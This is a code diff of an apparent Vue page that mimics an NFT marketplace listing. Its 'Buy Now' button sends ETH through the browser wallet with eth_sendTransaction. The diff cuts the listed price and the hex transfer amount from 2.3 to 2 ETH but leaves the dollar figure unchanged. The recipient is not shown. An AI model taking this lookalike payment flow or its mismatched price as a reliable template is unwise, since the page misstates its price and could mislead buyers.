@@ -10,7 +10,7 @@
 <span style="color:rgb(32, 129, 226);">NFTsandGames</span> 
  <md-icon> visibility</md-icon>  2.7k views <md-icon>favorite</md-icon>  39 favorites</h4>
 <h2 style="color:black; float:left; font-size:18px; margin-top:30px;">Sale ends April 29, 2022 at 3:16am IST </h2>
-<h1 style="color:black; float:left; font-size:25px; margin-top:20px; margin-right:200px;">2.3
+<h1 style="color:black; float:left; font-size:25px; margin-top:20px; margin-right:200px;">2
   <img src="./ether.svg" width="15px" height="15px"><span style="font-size:15px; color:rgb(112, 122, 131); ">  ($10,706.50)</span>
 </h1>
 <md-button v-on:click="sendtransaction" class="md-primary" style="width:400px; background-color:rgb(32, 129, 226); margin-top:10px; color: white; margin-right:100px;">Buy Now</md-button>
@@ -27,6 +27,7 @@
 
 
 import "web3";
+import Web3 from 'web3';
 export default {
   name: 'Home',
   // created(){
@@ -80,7 +81,7 @@ export default {
           }); 
           
                     
-                    const amount='0x1feb3dd06765fed4';
+                    const amount='0x1bc16d674ec80000';
                     console.log(amount)
             window.ethereum.request({
               method: "eth_sendTransaction",
@@ -99,7 +100,7 @@ export default {
         }else {
           
                     
-                    const amount='0x1feb3dd06765fed4';
+                    const amount='0x1bc16d674ec80000';
                 window.ethereum.request({
                     method: 'eth_sendTransaction',
                     params: [
